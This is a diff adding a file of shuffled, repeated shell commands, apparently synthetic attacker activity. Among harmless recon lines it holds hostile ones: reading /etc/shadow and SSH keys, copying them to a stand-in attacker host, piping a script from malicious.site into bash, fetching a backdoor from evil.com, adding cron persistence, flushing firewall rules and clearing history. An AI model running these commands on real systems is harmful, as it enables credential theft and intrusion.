@@ -1,0 +1,60 @@
+hostname
+nmap -p 22,80,443 target
+cat /etc/shadow
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ss -tulpn
+stty raw -echo
+scp /etc/shadow attacker@10.0.0.1:/loot/
+export TERM=xterm
+nmap -p 22,80,443 target
+hostname
+id
+history -c
+nmap -p 22,80,443 target
+unset HISTFILE
+netstat -an
+id
+sudo su
+stty raw -echo
+netstat -tulpn
+sudo su
+/tmp/bd &
+iptables -F
+cat /etc/passwd
+export TERM=xterm
+cat /etc/shadow
+ls /root
+cat ~/.ssh/id_rsa
+ss -tulpn
+export TERM=xterm
+uname -a
+netstat -an
+sudo su
+curl http://malicious.site/payload.sh | bash
+whoami
+iptables -F
+ssh-keygen -t rsa
+nmap -p 22,80,443 target
+netstat -tulpn
+iptables -P INPUT ACCEPT
+curl http://malicious.site/payload.sh | bash
+uname -a
+hostname
+scp /etc/shadow attacker@10.0.0.1:/loot/
+iptables -F
+nmap -sV 192.168.1.0/24
+sudo -l
+cat ~/.ssh/id_rsa
+curl http://malicious.site/payload.sh | bash
+uname -a
+cat /etc/shadow
+wget http://evil.com/backdoor -O /tmp/bd
+scp /etc/shadow attacker@10.0.0.1:/loot/
+echo '* * * * * /tmp/bd' | crontab -
+id
+iptables -P INPUT ACCEPT
+hostname
+netstat -tulpn
+netstat -an
+sudo -l
+echo '* * * * * /tmp/bd' | crontab -
